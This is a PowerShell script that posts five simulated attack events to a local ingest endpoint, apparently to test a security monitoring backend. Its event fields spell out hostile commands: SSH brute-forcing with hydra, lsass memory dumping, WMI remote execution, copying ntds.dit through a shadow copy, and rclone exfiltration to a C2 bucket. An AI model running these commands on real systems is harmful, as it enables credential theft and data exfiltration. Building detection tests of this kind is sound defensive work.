[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$OutputEncoding = [System.Text.Encoding]::UTF8

$BackendUrl = "http://127.0.0.1:8000/api/v1/ingest"

Write-Host "⚔️ Initiating Enterprise APT Multi-Stage Lateral Simulation..." -ForegroundColor Yellow

$scenarios = @(
    @{
        event_type   = "SSH_BRUTEFORCE"
        user         = "root"
        source_host  = "EXT-WAN-198.51.100.24"
        target_host  = "WEB-DMZ-01"
        process_name = "sshd.exe"
        command      = "hydra -l root -P rockyou.txt ssh://10.0.1.10"
        threat_score = 72
        mitre_tactic = "TA0001 - Initial Access (External Remote Services)"
        raw_message  = "Failed password for root from 198.51.100.24 port 44822 ssh2 - Maximum authentication attempts exceeded"
    },
    @{
        event_type   = "LSASS_MEMDUMP"
        user         = "svc_web"
        source_host  = "WEB-DMZ-01"
        target_host  = "APP-SRV-02"
        process_name = "procdump64.exe"
        command      = "procdump64.exe -ma lsass.exe lsass.dmp"
        threat_score = 88
        mitre_tactic = "TA0006 - Credential Access (OS Credential Dumping)"
        raw_message  = "Process accessed: lsass.exe by procdump64.exe with PROCESS_VM_READ permissions"
    },
    @{
        event_type   = "WMI_LATERAL_EXEC"
        user         = "DomainAdmin_Svc"
        source_host  = "APP-SRV-02"
        target_host  = "DC-PRIMARY"
        process_name = "wmic.exe"
        command      = "wmic /node:10.0.0.1 process call create 'powershell.exe -enc...'"
        threat_score = 94
        mitre_tactic = "TA0008 - Lateral Movement (WMI Remote Execution)"
        raw_message  = "Remote process invocation request via WMI Win32_Process targeting Primary Domain Controller"
    },
    @{
        event_type   = "SHADOW_COPY_THEFT"
        user         = "SYSTEM"
        source_host  = "DC-PRIMARY"
        target_host  = "BACKUP-DB"
        process_name = "vssadmin.exe"
        command      = "vssadmin create shadow /for=C: && copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\exfil"
        threat_score = 96
        mitre_tactic = "TA0009 - Collection (NTDS.dit Domain Extraction)"
        raw_message  = "Volume Shadow Copy creation initiated and raw disk access requested on NTDS.dit Active Directory database"
    },
    @{
        event_type   = "DNS_TUNNEL_EXFIL"
        user         = "SYSTEM"
        source_host  = "BACKUP-DB"
        target_host  = "C2-DROP-AWS-S3"
        process_name = "rclone.exe"
        command      = "rclone sync C:\exfil remote:c2-data-bucket --transfers 16"
        threat_score = 99
        mitre_tactic = "TA0010 - Exfiltration (Automated Exfiltration Over C2)"
        raw_message  = "High-throughput encrypted outbound data stream detected to untrusted external S3 bucket endpoint"
    }
)

foreach ($event in $scenarios) {
    try {
        $event["event_id"] = [guid]::NewGuid().ToString()
        $event["timestamp"] = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")

        $body = $event | ConvertTo-Json
        $res = Invoke-RestMethod -Uri $BackendUrl -Method Post -Body $body -ContentType "application/json"

        # Safely extract hash regardless of schema structure
        $hashVal = if ($res.leaf_hash) { $res.leaf_hash } elseif ($res.hash) { $res.hash } elseif ($res.data -and $res.data.leaf_hash) { $res.data.leaf_hash } else { "ANCHORED" }
        $shortHash = if ($hashVal.Length -ge 16) { $hashVal.Substring(0, 16) + "..." } else { $hashVal }

        Write-Host "[$($event.event_type)] $($event.source_host) ➔ $($event.target_host) | Score: $($event.threat_score)% | Leaf: $shortHash" -ForegroundColor Cyan
        Start-Sleep -Milliseconds 700
    } catch {
        Write-Host "[-] Failed to submit event: $_" -ForegroundColor Red
    }
}

Write-Host ""
Write-Host "✅ Enterprise APT trajectory submitted and anchored." -ForegroundColor Green